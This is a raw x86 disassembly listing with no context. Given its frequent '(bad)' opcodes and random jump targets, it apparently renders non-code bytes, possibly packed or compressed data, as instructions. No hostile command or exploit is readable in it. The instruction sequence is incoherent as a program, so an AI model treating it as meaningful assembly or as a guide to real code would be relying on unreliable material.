  43d795:	(bad)  
  43d796:	(bad)  
  43d797:	and    BYTE PTR [edi+0x5f],dl
  43d79a:	mov    ch,0x11
  43d79c:	pop    ecx
  43d79d:	push   0xffffffe9
  43d79f:	jbe    0x43d7fe
  43d7a1:	add    al,0xba
  43d7a3:	aad    0x4e
  43d7a5:	dec    esp
  43d7a6:	mov    bl,al
  43d7a8:	dec    esi
  43d7a9:	inc    ebx
  43d7aa:	fwait
  43d7ab:	enter  0x6e5b,0xe9
  43d7af:	jbe    0x43d7eb
  43d7b1:	add    ecx,DWORD PTR [ebp-0x7591b155]
  43d7b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43d7b8:	push   ecx
  43d7b9:	push   ecx
  43d7ba:	jmp    0x55471b35
  43d7bf:	mov    ds:0xc94a6e4e,al
  43d7c4:	push   ecx
  43d7c5:	aas    
  43d7c6:	jmp    0x2641e041
  43d7cb:	xchg   esp,eax
  43d7cc:	dec    esi
  43d7cd:	push   eax
  43d7ce:	add    BYTE PTR [esi+0x57],bl
  43d7d1:	outs   dx,BYTE PTR ds:[esi]
  43d7d2:	popa   
  43d7d3:	dec    eax
  43d7d4:	arpl   WORD PTR [eax+0x72],dx
  43d7d7:	mov    bl,0x64
  43d7d9:	popa   
  43d7da:	ins    BYTE PTR es:[edi],dx
  43d7db:	mov    ecx,0x65727411
  43d7e0:	pop    esp
  43d7e1:	pop    edi
  43d7e2:	push   edi
  43d7e3:	fadd   QWORD PTR ds:0x30ab051d
  43d7e9:	popa   
  43d7ea:	je     0x43d865
  43d7ec:	inc    esp
  43d7ed:	popa   
  43d7ee:	ins    BYTE PTR es:[edi],dx
  43d7ef:	imul   edi,esi,0x309f0086
  43d7f5:	pop    ebp
  43d7f6:	popa   
  43d7f7:	add    BYTE PTR [eax],al
  43d7f9:	add    BYTE PTR [eax],al
  43d7fb:	add    al,cl
  43d7fd:	bound  edi,QWORD PTR [esi]
  43d7ff:	imul   eax,eax,0xfb004f62
  43d805:	(bad)  
  43d806:	cmp    eax,0x6830c96c
  43d80b:	inc    esi
  43d80c:	mov    ch,0x61
  43d80e:	pop    ebp
  43d80f:	inc    edx
  43d810:	leave  
  43d811:	arpl   WORD PTR [esi+0x65],bx
  43d814:	fidiv  WORD PTR [eax]
  43d816:	add    BYTE PTR [eax],al
  43d818:	nop
  43d819:	(bad)  
  43d81a:	ds gs enter 0x6a15,0x69
  43d820:	retf   0x745e
  43d823:	gs mov esp,0x566672f
  43d829:	popa   
  43d82a:	pop    ebp
  43d82b:	dec    ecx
  43d82c:	repnz cmp BYTE PTR [edi+0x0],cl
  43d830:	cwde   
  43d831:	(bad)  
  43d832:	ds fadd DWORD PTR gs:[eax+0x6d]
  43d837:	jb     0x43d807
  43d839:	bound  esp,QWORD PTR [esi+0x74]
  43d83c:	call   0xeda9429d
  43d841:	sub    BYTE PTR [eax],al
  43d843:	add    ch,dh
  43d845:	add    DWORD PTR [ebx+0x65],ecx
  43d848:	enter  0x6812,0x72
  43d84c:	jne    0x43d884
  43d84e:	pop    ebp
  43d84f:	lds    ebp,FWORD PTR fs:0x32a76965
  43d856:	push   eax
  43d857:	ja     0x43d8ce
  43d859:	cmp    eax,0x368741fd
  43d85e:	pop    ecx
  43d85f:	dec    esp
  43d860:	add    BYTE PTR [eax],al
  43d862:	add    BYTE PTR [eax],al
  43d864:	add    BYTE PTR [ebp+edi*1+0x22875f52],cl
  43d86b:	add    al,0xf1
  43d86d:	ja     0x43d881
  43d86f:	push   ebx
  43d870:	ds push esp
  43d872:	div    DWORD PTR [ecx]
  43d874:	arpl   WORD PTR [edi+edi*8+0x33],dx
  43d878:	je     0x43d8e1
  43d87a:	(bad)  
  43d87c:	in     eax,0x79
  43d87e:	icebp  
  43d87f:	outs   dx,BYTE PTR fs:[esi]
  43d881:	inc    ecx
  43d882:	(bad)  
  43d883:	pop    ebp
  43d884:	ins    BYTE PTR es:[edi],dx
  43d885:	xor    al,0xc7
  43d887:	pusha  
  43d888:	imul   edx,DWORD PTR [esi-0x6a],0xe7750054
  43d88f:	add    cl,BYTE PTR [edx+ebx*1-0x46]
  43d893:	pop    eax
  43d894:	dec    esp
  43d895:	or     al,0xbd
  43d897:	push   edx
  43d898:	pop    edi
  43d899:	daa    
  43d89a:	ret    0x3d
  43d89d:	jne    0x43d898
  43d89f:	clc    
  43d8a0:	push   eax
  43d8a1:	pop    es
  43d8a2:	ret    0x6348
  43d8a5:	and    eax,0x105d678d
  43d8aa:	ins    BYTE PTR es:[edi],dx
  43d8ab:	push   ebx
  43d8ac:	dec    ebx
  43d8ad:	fdiv   DWORD PTR [esi+0x67]
  43d8b0:	outs   dx,BYTE PTR ds:[esi]
  43d8b1:	in     al,dx
  43d8b2:	frndint 
  43d8b4:	xor    BYTE PTR [eax+eiz*4+0x59],0x74
  43d8b9:	mov    dh,0x70
  43d8bb:	popa   
  43d8bc:	imul   edx,esp,0x77
  43d8bf:	pop    eax
  43d8c0:	dec    esp
  43d8c1:	fdivr  QWORD PTR [edi+0x59]
  43d8c4:	push   ecx
  43d8c5:	jne    0x43d885
  43d8c7:	add    al,BYTE PTR [ecx+0x0]
  43d8ca:	add    BYTE PTR [eax],al
  43d8cc:	add    BYTE PTR [eax],al
  43d8ce:	rol    BYTE PTR [edx],1
  43d8d0:	pop    ebx
  43d8d1:	dec    edx
  43d8d2:	ror    BYTE PTR [esi+0x50],cl
  43d8d5:	push   edx
  43d8d6:	xchg   esi,eax
  43d8d7:	xor    edx,DWORD PTR [eax+0x55]
  43d8da:	test   eax,0x8f4b3c5d
  43d8df:	pusha  
  43d8e0:	push   edx
  43d8e1:	add    al,0x40
  43d8e3:	add    ah,BYTE PTR [edx]
  43d8e5:	pop    edi
  43d8e6:	cmp    DWORD PTR [esi],0x5d876b35
  43d8ec:	adc    ebx,DWORD PTR [ebx-0x7b]
  43d8ef:	pop    ebp
  43d8f0:	cmp    al,BYTE PTR [edi+ebx*2]
  43d8f3:	add    al,0x22
  43d8f5:	pop    edi
  43d8f6:	popa   
  43d8f7:	xor    edx,DWORD PTR [eax]
  43d8f9:	push   ebp
  43d8fa:	imul   ebx,DWORD PTR [ebp-0x4],0x860563f
  43d901:	dec    edi
  43d902:	popa   
  43d903:	dec    esi
  43d904:	adc    al,0x4b
  43d906:	cmp    DWORD PTR [ecx+0x1],esp
  43d909:	popa   
  43d90a:	inc    esi
  43d90b:	popa   
  43d90c:	add    bl,BYTE PTR [edi+0x75]
  43d90f:	add    dh,al
  43d911:	add    eax,0x47d35d34
  43d916:	sbb    al,0x5f
  43d918:	shl    BYTE PTR [edx+eax*2+0x56],0xa3
  43d91d:	push   ebp
  43d91e:	adc    dl,BYTE PTR [eax-0x34]
  43d921:	push   esp
  43d922:	jne    0x43d926
  43d924:	xchg   ebp,eax
  43d925:	add    eax,0x33bb5d34
  43d92a:	adc    edx,DWORD PTR [edi-0x3a]
  43d92d:	pop    esi
  43d92e:	or     BYTE PTR [ebx-0x45],dl
  43d931:	push   0x0
  43d933:	add    BYTE PTR [eax],al
  43d935:	add    BYTE PTR [eax],al
  43d937:	ficomp WORD PTR [ebp-0x6a]
  43d93a:	add    eax,DWORD PTR [ecx-0x16a155fc]
  43d940:	xor    eax,0x56e65f7a
  43d945:	mov    WORD PTR [ecx-0x26],es
  43d948:	push   esi
  43d949:	test   BYTE PTR [ecx-0x56],cl
  43d94c:	push   ebp
  43d94d:	add    BYTE PTR [ebp+eax*4+0x3bab0002],cl
  43d954:	pop    ebx
  43d955:	ins    DWORD PTR es:[edi],dx
  43d956:	pop    ebp
  43d957:	(bad)  
  43d958:	and    eax,0x25a596b
  43d95d:	add    BYTE PTR [ecx+0x3e6c4177],ch
  43d963:	xchg   edi,eax
  43d964:	daa    
  43d965:	ins    BYTE PTR es:[edi],dx
  43d966:	xor    al,0x94
  43d968:	pop    ebx
  43d969:	imul   edi,DWORD PTR [ebx],0x487435a8
  43d96f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43d970:	push   ebx
  43d971:	ins    DWORD PTR es:[edi],dx
  43d972:	and    al,0x99
  43d974:	add    al,BYTE PTR [eax]
  43d976:	xchg   DWORD PTR [edi+0x41],esi
  43d979:	arpl   WORD PTR ds:0x1b6355a4,dx
  43d97f:	xor    eax,0x44086263
  43d984:	push   esi
  43d985:	je     0x43d9a3
  43d987:	inc    eax
  43d988:	ss pop edi
  43d98a:	cvtpi2ps xmm2,QWORD PTR [ebx+0x5f]
  43d98e:	push   cs
  43d98f:	push   esp
  43d990:	add    al,BYTE PTR [eax]
  43d992:	lahf   
  43d993:	jo     0x43d9d6
  43d995:	arpl   bp,bx
  43d997:	jb     0x43d9f8
  43d999:	ins    DWORD PTR es:[edi],dx
  43d99a:	rol    BYTE PTR [eax],cl
  43d99c:	add    BYTE PTR [eax],al
  43d99e:	add    BYTE PTR [eax],al
  43d9a0:	push   0x67cc6358
  43d9a5:	push   edx
  43d9a6:	pop    edi
  43d9a7:	retf   0x4315
  43d9aa:	js     0x43d94a
  43d9ac:	jbe    0x43d94f
  43d9ae:	std    
  43d9af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43d9b0:	adc    eax,0x1ac6524e
  43d9b5:	push   ebx
  43d9b6:	imul   eax,esp,0x29
  43d9b9:	pop    esp
  43d9ba:	bound  edx,QWORD PTR [esi-0x6aa0a63c]
  43d9c0:	fstp   DWORD PTR [ebx+0x6a]
  43d9c3:	mov    esi,0x9bfd3376
  43d9c8:	rcl    DWORD PTR [edx+0x52],1
  43d9cb:	add    ch,ah
  43d9cd:	bound  ebp,QWORD PTR [edi+0x4f]
  43d9d0:	repnz pop es
  43d9d2:	popa   
  43d9d3:	ins    BYTE PTR es:[edi],dx
  43d9d4:	icebp  
  43d9d5:	add    esi,ecx
  43d9d7:	add    al,0xe1
  43d9d9:	pop    edi
  43d9da:	gs popa 
  43d9dc:	int3   
  43d9dd:	adc    al,0x61
  43d9df:	gs ret 
  43d9e1:	cmp    eax,0x5ab5465e
  43d9e6:	pop    ebp
  43d9e7:	add    BYTE PTR [ebp+0x2],ah
  43d9ea:	dec    ebx
  43d9eb:	gs push eax
  43d9ed:	inc    ebx
  43d9ee:	outs   dx,BYTE PTR ds:[esi]
  43d9ef:	gs mov edx,0x98000032
  43d9f5:	add    DWORD PTR [ebx],edi
  43d9f7:	jb     0x43d9aa
  43d9f9:	pop    edi
  43d9fa:	je     0x43da61
  43d9fc:	mov    ds:0x99656c57,al
  43da01:	pop    edi
  43da02:	jo     0x43da74
  43da04:	add    BYTE PTR [eax],al
  43da06:	add    BYTE PTR [eax],al
  43da08:	add    BYTE PTR [ebp+0x5c],dh
  43da0b:	pop    edi
  43da0c:	push   edi
  43da0d:	int3   
  43da0e:	add    DWORD PTR [ebp+0x0],edi
  43da11:	lahf   
  43da12:	xor    BYTE PTR [ebp+0x61],bl
  43da15:	shl    BYTE PTR [edx+0x3d],0x76
  43da19:	jno    0x43da77
  43da1b:	je     0x43da74
  43da1d:	int3   
  43da1e:	add    DWORD PTR [ebp+0x7462e301],edi
  43da24:	inc    ebx
  43da25:	shl    DWORD PTR [ebx],0x6a
  43da28:	gs mov edx,0xbe685435
  43da2e:	bound  ebx,QWORD PTR [ecx+0x64]
  43da31:	lds    esp,FWORD PTR ds:0xc5510000
  43da37:	dec    esp
  43da38:	ins    BYTE PTR es:[edi],dx
  43da39:	mov    edi,0xbb6c6c3e
  43da3e:	pusha  
  43da3f:	add    BYTE PTR [eax],al
  43da41:	mov    ds:0xf6c4cc5,al
  43da46:	pop    es
  43da47:	push   0x65
  43da49:	jne    0x43dac1
  43da4b:	cld    
  43da4c:	fbstp  TBYTE PTR [esp+ebx*4+0x5f]
  43da50:	je     0x43da0a
  43da52:	sub    DWORD PTR [ebx+0x74],0xffffffb6
  43da56:	je     0x43dab0
  43da58:	arpl   WORD PTR [ecx-0x2b9cb17d],bp
  43da5e:	jg     0x43da5c
  43da60:	or     BYTE PTR [ecx+0x9],bh
  43da63:	pop    ecx
  43da64:	ins    DWORD PTR es:[edi],dx
  43da65:	nop
  43da66:	das    
  43da67:	cmp    DWORD PTR [edx-0x68],esi
  43da6a:	cmp    eax,0x50
  43da6f:	add    BYTE PTR [eax],al
  43da71:	add    BYTE PTR [ebp-0x7c],dh
  43da74:	call   DWORD PTR [ecx-0x64]
  43da77:	or     DWORD PTR [eax+0x73],edx
  43da7a:	xchg   esp,eax
  43da7b:	aaa    
  43da7c:	xor    al,0x6e
  43da7e:	xchg   edx,eax
  43da7f:	pop    es
  43da80:	pop    ecx
  43da81:	pop    ebp
  43da82:	sbb    ebx,0x167416fc
  43da88:	pop    esp
  43da89:	addr16 popa 
  43da8b:	or     ecx,DWORD PTR [esi+0x69]
  43da8e:	push   esi
  43da8f:	test   BYTE PTR [esi+0x6d],0x75
  43da93:	adc    eax,DWORD PTR [eax]
  43da95:	dec    ebp
  43da96:	pop    eax
  43da97:	(bad)  
  43da98:	cmp    DWORD PTR [esi+0x47],ebp
  43da9b:	hlt    
  43da9c:	dec    ebp
  43da9d:	dec    ebx
  43da9e:	push   edx
  43da9f:	neg    DWORD PTR [eax+0x0]
  43daa2:	jne    0x43dac8
  43daa4:	std    
  43daa5:	inc    eax
  43daa6:	sbb    BYTE PTR [edi-0x54e796c1],ah
  43daac:	dec    ecx
  43daad:	je     0x43dac7
  43daaf:	test   eax,0xbe085f42
  43dab4:	sub    eax,DWORD PTR [eax]
  43dab6:	jne    0x43db2f
  43dab8:	std    
  43dab9:	inc    eax
  43daba:	adc    BYTE PTR [edi-0x77f89cd6],cl
  43dac0:	imul   ecx,DWORD PTR gs:[ebx],0x7551549e
  43dac7:	add    ch,BYTE PTR [esi+edi*8+0x51934fde]
  43dace:	rcl    BYTE PTR [ebp-0x69],0x6a
  43dad2:	les    eax,FWORD PTR [edx]
  43dad4:	retf   0xfe
  43dad7:	add    BYTE PTR [eax],al
  43dad9:	add    BYTE PTR [eax],al
  43dadb:	fimul  WORD PTR [edi+0x7b]
  43dade:	push   ecx
  43dadf:	test   al,0x61
  43dae1:	jae    0x43db0f
  43dae3:	jne    0x43dae7
  43dae5:	jl     0x43dae7
  43dae7:	lods   al,BYTE PTR ds:[esi]
  43dae8:	push   edx
  43dae9:	test   BYTE PTR [ebp-0x4a],ah
  43daec:	dec    esp
  43daed:	dec    esp
  43daee:	mov    ax,ds:0xe203e72b
  43daf4:	add    DWORD PTR [edx],ebp
  43daf6:	pop    edi
  43daf7:	mov    eax,ds:0xa352543f
  43dafc:	pop    ebp
  43dafd:	push   ecx
  43dafe:	push   eax
  43daff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43db00:	push   eax
  43db01:	dec    edx
  43db02:	popa   
  43db03:	xchg   esi,eax
  43db04:	dec    edi
  43db05:	ss dec ebx
  43db07:	xchg   ecx,eax
  43db08:	add    cl,ah
  43db0a:	add    dh,BYTE PTR [esi]
  43db0c:	dec    edx
  43db0d:	pop    ss
  43db0e:	arpl   WORD PTR [edi+0x5e],bx
  43db11:	and    al,0x66
  43db13:	addr16 pop ecx
  43db15:	adc    eax,0x4554f65
  43db1a:	dec    cx
  43db1c:	das    
  43db1d:	sti    
  43db1e:	push   ecx
  43db1f:	push   edx
  43db20:	push   esp
  43db21:	add    dl,BYTE PTR [ecx+0x24]
  43db24:	add    ch,BYTE PTR [ebx]
  43db26:	dec    DWORD PTR [esi+0x4f]
  43db29:	repz push ecx
  43db2b:	push   eax
  43db2c:	push   ebp
  43db2d:	xlat   BYTE PTR ds:[ebx]
  43db2e:	push   0x6a
  43db30:	add    dl,BYTE PTR [ebp-0x1]
  43db33:	inc    esp
  43db34:	pop    ecx
  43db35:	aad    0x4f
  43db37:	es popa 
  43db39:	mov    ebx,0xb55d0632
  43db3e:	pop    edx
  43db3f:	add    BYTE PTR [eax],al
  43db41:	add    BYTE PTR [eax],al
  43db43:	add    BYTE PTR [esi],dh
  43db45:	dec    edx
  43db46:	out    0x3,eax
  43db48:	sar    bh,0xff
  43db4b:	call   0x59c4:0x9964231b
  43db52:	pop    ebp
  43db53:	mov    ebp,es
  43db55:	push   ebp
  43db56:	dec    ebx
  43db57:	test   bl,bl
  43db59:	pop    ecx
  43db5a:	outs   dx,BYTE PTR ds:[esi]
  43db5b:	nop
  43db5c:	jbe    0x43db30
  43db5e:	add    esi,DWORD PTR [edi+0x7c7454df]
  43db64:	xlat   BYTE PTR ds:[ebx]
  43db65:	push   esi
  43db66:	push   eax
  43db67:	jnp    0x43db42
  43db69:	dec    esi
  43db6a:	arpl   WORD PTR [edx-0x1687c056],cx
  43db70:	jbe    0x43db0c
  43db72:	jmp    FWORD PTR [ecx]
  43db74:	ret    
  43db75:	pop    edi
  43db76:	pop    edi
  43db77:	push   ebp
  43db78:	mov    WORD PTR [edx],?
  43db7a:	outs   dx,BYTE PTR ds:[esi]
  43db7b:	inc    esi
  43db7c:	xchg   edx,eax
  43db7d:	pop    edi
  43db7e:	ins    DWORD PTR es:[edi],dx
  43db7f:	pop    edx
  43db80:	dec    esi
  43db81:	add    al,BYTE PTR [eax]
  43db83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43db84:	jo     0x43dbc7
  43db86:	arpl   WORD PTR ds:0x407258ac,si
  43db8c:	mov    ds:0x5c3c6a59,eax
  43db91:	pop    eax
  43db92:	je     0x43dbd3
  43db94:	push   eax
  43db95:	push   esp
  43db96:	or     BYTE PTR [bp+di+0x56],bl
  43db9a:	arpl   WORD PTR [esi],di
  43db9c:	jno    0x43db23
  43db9e:	add    esi,DWORD PTR ds:0x8635431
  43dba4:	pop    ebp
  43dba5:	adc    eax,0x272e
  43dbaa:	add    BYTE PTR [eax],al
  43dbac:	add    BYTE PTR [eax],ah
  43dbae:	push   esp
  43dbaf:	ins    DWORD PTR es:[edi],dx
  43dbb0:	std    
  43dbb1:	jbe    0x43dbbc
  43dbb3:	std    
  43dbb4:	sbb    al,0x16
  43dbb6:	and    esp,DWORD PTR [ebp+esi*4+0x49]
  43dbba:	and    al,0x6e
  43dbbc:	enter  0x4b48,0x51
  43dbc0:	jmp    0xb5479a3b
  43dbc5:	cs push esp
  43dbc7:	arpl   WORD PTR [eax],ax
  43dbc9:	mov    ebp,0xd2322b5a
  43dbce:	pop    ecx
  43dbcf:	js     0x43dc45
  43dbd1:	mov    esi,?
  43dbd3:	or     BYTE PTR ds:0x65645f0b,al
  43dbd9:	pop    ds
  43dbda:	pop    esi
  43dbdb:	pop    ecx
  43dbdc:	jb     0x43dc06
  43dbde:	and    eax,0x59f07545
  43dbe3:	popa   
  43dbe4:	inc    edx
  43dbe5:	in     eax,0x59
  43dbe7:	pop    ebp
  43dbe8:	add    BYTE PTR ds:0xf2693e07,dh
  43dbee:	sub    DWORD PTR [esi],edi
  43dbf0:	imul   edi,DWORD PTR [esi-0xab98ba8],0x1c575d61
  43dbfa:	push   es
  43dbfb:	jns    0x43dbfd
  43dbfd:	dec    edi
  43dbfe:	pop    eax
  43dbff:	pop    ebp
  43dc00:	popa   
  43dc01:	mov    eax,0xae69442b
  43dc06:	sub    ebx,DWORD PTR [ebx+0x74]
  43dc09:	mov    ds:0xc577158,eax
  43dc0e:	push   es
  43dc0f:	in     al,dx
  43dc10:	add    al,0x0
  43dc12:	add    BYTE PTR [eax],al
  43dc14:	add    BYTE PTR [eax],al
  43dc16:	pop    edx
  43dc17:	pop    edi
  43dc18:	push   0x74
  43dc1a:	test   eax,0x8e466c27
  43dc1f:	sub    ebx,DWORD PTR [ebp+0x0]
  43dc22:	or     al,0x9
  43dc24:	dec    edx
  43dc25:	gs ins DWORD PTR es:[edi],dx
  43dc27:	sub    bh,BYTE PTR [esi]
  43dc29:	imul   edx,eax,0x5900002a
  43dc2f:	pop    es
  43dc30:	aas    
  43dc31:	gs enter 0x5cf9,0x6d
  43dc36:	mov    esp,0x747458f5
  43dc3b:	std    
  43dc3c:	(bad)  
  43dc3d:	dec    DWORD PTR [ebp+0x6]
  43dc40:	aas    
  43dc41:	gs enter 0x614b,0x6c
  43dc46:	jne    0x43dc16
  43dc48:	xor    DWORD PTR [edi+0xf],esp
  43dc4b:	mov    BYTE PTR [edi+0x78],0x75
  43dc4f:	push   edx
  43dc50:	add    DWORD PTR [edx+0xc],edx
  43dc53:	jge    0x43dca5
  43dc55:	jae    0x43dc6b
  43dc57:	mov    DWORD PTR [ebx+0x6c],0x6180e1
  43dc5e:	jne    0x43dc39
  43dc60:	add    eax,DWORD PTR [edx-0x34]
  43dc63:	xchg   ecx,eax
  43dc64:	pusha  
  43dc65:	cmp    eax,0x635188c9
  43dc6a:	jne    0x43dc18
  43dc6c:	add    BYTE PTR [esi-0x30],cl
  43dc6f:	xchg   esi,eax
  43dc70:	pop    ebp
  43dc71:	jb     0x43dc4b
  43dc73:	addr16 pop ebx
  43dc75:	outs   dx,BYTE PTR ds:[esi]
  43dc76:	ror    BYTE PTR [eax+edx*2+0x69],1
  43dc7d:	add    BYTE PTR [eax],al
  43dc7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43dc80:	xor    dh,BYTE PTR [esi]
  43dc82:	add    BYTE PTR [ebp-0x12],dh
  43dc85:	cld    
  43dc86:	inc    ecx
  43dc87:	mov    WORD PTR [ecx+0x68],ss
  43dc8a:	dec    edx
  43dc8b:	nop
  43dc8c:	push   ebx
  43dc8d:	pop    eax
  43dc8e:	inc    edx
  43dc8f:	pushf  
  43dc90:	jmp    DWORD PTR [eax+0x51]
  43dc93:	jne    0x43dcdf
  43dc95:	or     BYTE PTR [ebp-0x68],cl
  43dc98:	test   DWORD PTR [ebp+0x67],0x743d4e89
  43dc9f:	imul   edi,ebp,0x1f605e54
  43dca5:	popa   
  43dca6:	ins    DWORD PTR es:[edi],dx
  43dca7:	dec    edx
  43dca8:	stos   DWORD PTR es:[edi],eax
  43dca9:	cld    
  43dcaa:	inc    ebp
  43dcab:	jo     0x43dcb4
  43dcad:	push   ebx
  43dcae:	je     0x43dcf7
  43dcb0:	or     al,0x54
  43dcb2:	ja     0x43dd0f
  43dcb4:	jmp    0x6d60:0x1779c103
  43dcbb:	xor    cl,BYTE PTR [esi]
  43dcbd:	pop    eax
  43dcbe:	push   edx
  43dcbf:	adc    al,0xbf
  43dcc1:	push   ecx
  43dcc2:	arpl   WORD PTR [ebp+0x2],si
  43dcc5:	das    
  43dcc6:	or     BYTE PTR [ecx+0x2e],cl
  43dcc9:	(bad)  
  43dcca:	xor    al,0x16
  43dccc:	ss mov ecx,0xc4372162
  43dcd2:	add    esi,DWORD PTR [ebp+0x13669b05]
  43dcd8:	das    
  43dcd9:	shl    BYTE PTR [ecx+0x1a],1
  43dcdc:	ss int3 
  43dcde:	xor    esp,ebx
  43dce0:	das    
  43dce1:	(bad)  
  43dce2:	data16 add BYTE PTR [eax],al
  43dce5:	add    BYTE PTR [eax],al
  43dce7:	add    al,bl
  43dce9:	xor    esp,edi
  43dceb:	add    ebx,DWORD PTR [esi]
  43dced:	pop    es
  43dcee:	mov    dh,0x4a
  43dcf0:	enter  0x8c36,0x5e
  43dcf4:	test   eax,0xa1667c29
  43dcf9:	das    
  43dcfa:	test   eax,0x9325d15a
  43dcff:	pop    edx
  43dd00:	into   
  43dd01:	and    eax,0x50d03e7
  43dd06:	mov    ds:0x5056a166,al
  43dd0b:	pop    edi
  43dd0c:	xchg   esi,eax
  43dd0d:	pop    esp
  43dd0e:	dec    edx
  43dd0f:	bound  edx,QWORD PTR [esi-0x6395beb7]
  43dd15:	xor    al,0x3c
  43dd17:	arpl   WORD PTR [ecx+0x75625229],ax
  43dd1d:	add    ah,dh
  43dd1f:	add    eax,0x403b25b4
  43dd24:	pop    esp
  43dd25:	and    ecx,DWORD PTR [eax+0x60]
  43dd28:	inc    ecx
  43dd29:	sub    DWORD PTR [edi+eiz*2],edx
  43dd2c:	jne    0x43dd30
  43dd2e:	adc    al,BYTE PTR [esi]
  43dd30:	xor    al,0x25
  43dd32:	sbb    esi,DWORD PTR ds:0x6713334a
  43dd38:	pop    esi
  43dd39:	push   esi
  43dd3a:	adc    BYTE PTR [edi+0x56],bl
  43dd3d:	add    dl,BYTE PTR [eax+0x5]
  43dd40:	xor    al,0x25
  43dd42:	add    ch,bh
  43dd44:	ins    BYTE PTR es:[edi],dx
  43dd45:	sub    DWORD PTR [esp+esi*8+0x4b],ebp
  43dd49:	and    ecx,DWORD PTR [edx-0x38]
  43dd4c:	add    BYTE PTR [eax],al
  43dd4e:	add    BYTE PTR [eax],al
  43dd50:	add    BYTE PTR [ebx+0x23],al
  43dd53:	inc    edx
  43dd54:	into   
  43dd55:	inc    eax
  43dd56:	push   esp
  43dd57:	imul   eax,ebp,0x9c632b2b
  43dd5d:	adc    eax,0x46bd6a33
  43dd62:	sub    DWORD PTR [edi-0x31],esp
  43dd65:	and    dl,BYTE PTR [ecx+0x0]
  43dd68:	mov    ?,WORD PTR [ecx+0x4f]
  43dd6b:	jae    0x43dd31
  43dd6d:	shl    BYTE PTR [edi],0x50
  43dd70:	mov    eax,cs
  43dd72:	and    al,0x69
  43dd74:	fwait
  43dd75:	mov    ebx,0xdb8a6a5f
  43dd7a:	std    
  43dd7b:	push   0x6336d494
  43dd80:	jnp    0x43ddf8
  43dd82:	mov    dh,0x3
  43dd84:	xchg   esi,eax
  43dd85:	or     BYTE PTR [ebp+0x41],0x8c
  43dd89:	retf   0x5cff
  43dd8c:	jne    0x43dd5d
  43dd8e:	xor    al,0x63
  43dd90:	sub    al,dl
  43dd92:	sub    al,0x6d
  43dd94:	dec    esi
  43dd95:	xchg   ebp,eax
  43dd96:	and    ecx,DWORD PTR [ebp+0x4c]
  43dd99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43dd9a:	sub    eax,0x47ab3e67
  43dd9f:	fs jmp 0x2543841b
  43dda5:	call   0x5423:0x4d48442d
  43ddac:	inc    eax
  43ddad:	push   esp
  43ddae:	and    edx,DWORD PTR [esi+edx*1+0x3b]
  43ddb2:	daa    
  43ddb3:	ins    BYTE PTR es:[edi],dx
  43ddb4:	add    al,0x0
  43ddb6:	add    BYTE PTR [eax],al
  43ddb8:	add    BYTE PTR [eax],al
  43ddba:	popf   
  43ddbb:	daa    
  43ddbc:	imul   ecx,DWORD PTR [ecx+edi*2],0xffffffa9
  43ddc0:	std    
  43ddc1:	pop    ds
  43ddc2:	sub    esi,DWORD PTR [esi]
  43ddc4:	arpl   WORD PTR [eax],ax
  43ddc6:	mov    esi,0x6763675e
  43ddcb:	sub    DWORD PTR [ecx+ecx*2+0x7a],esp
  43ddcf:	and    ebp,DWORD PTR [edx+0x65]
  43ddd2:	test   eax,0x8c746629
  43ddd7:	add    ah,bl
  43ddd9:	add    ah,ch
  43dddb:	pop    esp
  43dddc:	je     0x43de43
  43ddde:	scas   al,BYTE PTR es:[edi]
  43dddf:	pop    esi
  43dde0:	arpl   WORD PTR [bx+0x6429],si
  43dde5:	inc    esp
  43dde6:	mov    cl,0x23
  43dde8:	push   0x65
  43ddea:	test   eax,0x5c746629
  43ddef:	add    bl,BYTE PTR [ebx]
  43ddf1:	add    DWORD PTR [edx],edx
  43ddf3:	pop    edi
  43ddf4:	ins    BYTE PTR es:[edi],dx
  43ddf5:	and    BYTE PTR gs:[edi+0x65],bl
  43ddf9:	and    BYTE PTR gs:[ebp+0x44],bl
  43ddfd:	outs   dx,DWORD PTR ds:[esi]
  43ddfe:	out    dx,eax
  43ddff:	inc    ebp
  43de00:	pop    ecx
  43de01:	je     0x43ddf4
  43de03:	cmc    
  43de04:	pusha  
  43de05:	ins    DWORD PTR es:[edi],dx
  43de06:	icebp  
  43de07:	add    DWORD PTR [ecx],edi
  43de09:	add    eax,0x727450e8
  43de0e:	jmp    DWORD PTR [edx]
  43de10:	jo     0x43de53
  43de12:	sbb    al,0x2
  43de14:	and    al,0x1
  43de16:	push   edx
  43de17:	pop    edi
  43de18:	ins    BYTE PTR es:[edi],dx
  43de19:	gs pusha 
  43de1b:	pop    edi
  43de1c:	gs add BYTE PTR gs:[eax],al
  43de20:	add    BYTE PTR [eax],al
  43de22:	add    BYTE PTR [eax+0x5d],dl
  43de25:	dec    esp
  43de26:	outs   dx,DWORD PTR ds:[esi]
  43de27:	mov    edi,0xa5466c27
  43de2c:	and    bl,BYTE PTR [ebp+0x54]
  43de2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43de30:	and    ebx,DWORD PTR [ebp+0x0]
  43de33:	bound  eax,QWORD PTR [ebx]
  43de35:	aas    
  43de36:	mov    al,gs:0x717267fa
  43de3c:	daa    
  43de3d:	fs inc ebx
  43de3f:	imul   ebx,DWORD PTR [esp+esi*2+0x65],0x75
  43de44:	adc    ebx,DWORD PTR [eax+0x0]
  43de47:	jne    0x43de83
  43de49:	add    DWORD PTR [ebp+0x58],ecx
  43de4c:	mov    edi,0x6476830
  43de51:	arpl   WORD PTR [esi+esi*1+0x4],sp
  43de55:	pop    edx
  43de56:	je     0x43de68
  43de58:	mov    bl,0x50
  43de5a:	add    BYTE PTR [ebp+0x77],dh
  43de5d:	inc    BYTE PTR [eax+0x10]
  43de60:	xlat   BYTE PTR ds:[ebx]
  43de61:	sub    al,0x6e
  43de63:	and    cl,al
  43de65:	ins    DWORD PTR es:[di],dx
  43de67:	push   es
  43de68:	bound  esp,QWORD PTR [eax+0x0]
  43de6b:	jne    0x43de62
  43de6d:	add    BYTE PTR [edi+eax*1-0x3e],dl
  43de71:	inc    edi
  43de72:	push   0xffffffe9
  43de74:	into   
  43de75:	dec    esi
  43de76:	cmp    eax,0x6750c2e7
  43de7b:	(bad)  
  43de7c:	mov    bl,BYTE PTR [eax+0x4d]
